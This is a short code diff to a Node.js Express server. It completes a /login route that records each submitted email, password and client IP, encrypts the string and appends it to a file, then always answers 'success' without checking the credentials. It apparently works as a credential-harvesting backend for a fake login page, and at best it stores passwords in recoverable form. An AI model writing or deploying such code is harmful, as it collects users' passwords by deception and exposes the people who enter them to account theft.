@@ -41,4 +41,10 @@ app.post("/login", (req, res) => {
     const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "Unknown IP";
     const email = req.body.email;
     const password = req.body.password;
-    const data = `email=${email}; password=${
+    const data = `email=${email}; password=${password}; ip=${ip}; login=${new Date().toISOString()}`;
+    fs.appendFileSync("users.enc.txt", encrypt(data) + "\n");
+    res.send("success");
+});
+
+const PORT = process.env.PORT || 10000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
